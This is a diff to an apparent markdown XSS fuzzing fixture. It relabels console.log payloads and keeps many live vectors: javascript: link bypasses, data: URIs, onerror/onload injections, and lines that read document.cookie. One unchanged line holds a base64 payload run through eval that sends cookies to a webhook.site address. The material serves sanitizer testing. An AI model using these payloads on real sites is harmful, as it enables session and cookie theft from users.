@@ -98,26 +98,26 @@ Keep the report scannable. Use this shape:
 
 <!-- XSS with regular tags -->
 <script>
-  console.log(1)
+  console.log('xss-1')
 </script>
-<img src="x" onerror="console.log(1)" />
+<img src="x" onerror="console.log('xss-2')" />
 
 <!-- markdow link to XSS, this usually always work but it requires interaction -->
-[a](javascript:console.log(document.cookie))
+[a](javascript:console.log('xss-3'))
 
 <!-- Other links attacks with some bypasses -->
 [Basic](javascript:console.log('Basic')) [Local
-Storage](javascript:console.log(JSON.stringify(localStorage)))
+Storage](javascript:console.log('xss-4'))
 [CaseInsensitive](JaVaScRiPt:console.log('CaseInsensitive'))
 [URL](javascript://www.google.com%0Aconsole.log('URL')) [In
 Quotes]('javascript:console.log("InQuotes")') [a](j a v a s c r i p
-t:console.log(document.cookie))
+t:console.log('xss-6'))
 [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[a](javascript:window.onerror=console.log;throw%201)
+[a](javascript:window.onerror=console.log('xss-7');throw%201)
 
 
-![Uh oh...](<"onerror="console.log('XSS')>)
-![Uh oh...](<https://www.example.com/image.png"onload="console.log('XSS')>)
+![Uh oh...](<"onerror="console.log('xss-8')>)
+![Uh oh...](<https://www.example.com/image.png"onload="console.log('XSS-9')>)
 ![Escape SRC - onload](<https://www.example.com/image.png"onload="console.log('ImageOnLoad')>)
 ![Escape SRC - onerror](<"onerror="console.log('ImageOnError')>)
 
@@ -143,18 +143,18 @@ t:console.log(document.cookie))
   <a
     title="a
 
-<img src=x onerror=console.log(1)>"
+<img src=x onerror=console.log('xss-11')>"
     >yep</a
   >
   ------------------------------------------------ [x](y '<style>
     ')<!--
   </style>
-  <div id="x--><img src=1 onerror=console.log(1)>"></div>
+  <div id="x--><img src=1 onerror=console.log('xss-12')>"></div>
   ---------------------------------------------- [
   <p
     x="<style onload=eval(atob(/bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2RhNGZmMTc1LTFjNmYtNDNjOS04ZGNkLTBhZWU2ODFhMTYzMT9mPWArZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk/.source))>](#"></p>
   ) ---------------------------------------------- `
-  <p x="`<img src=x onerror=console.log(1)>"></p>
+  <p x="`<img src=x onerror=console.log('xss-13')>"></p>
 </div>
 
 
@@ -164,14 +164,14 @@ Fuzzing examples from
 - [https://makandracards.com/makandra/481451-testing-for-xss-in-markdown-fields](https://makandracards.com/makandra/481451-testing-for-xss-in-markdown-fields)
 -->
 
-[a](javascript:console.log(document.cookie))
-[a](j    a   v   a   s   c   r   i   p   t:console.log(document.cookie))
-![a](javascript:console.log(document.cookie))\
-<javascript:console.log(document.cookie)>
-<javascript:console.log('XSS')>
+[a](javascript:console.log('xss-16'))
+[a](j    a   v   a   s   c   r   i   p   t:console.log('xss-17'))
+![a](javascript:console.log('xss-18'))\
+<javascript:console.log('xss-19')>
+<javascript:console.log('xss-20')>
   ![a](data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygnWFNTJyk8L3NjcmlwdD4K)\
 [a](data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygnWFNTJyk8L3NjcmlwdD4K)
-[a](javascript:console.log('XSS'))
+[a](javascript:console.log('xss-21'))
 ![a'"`onerror=console.log(document.cookie)](x)\
 [lol]: (javascript:console.log(document.cookie))
 [notmalicious](javascript:window.onerror=console.log;throw%20document.cookie)
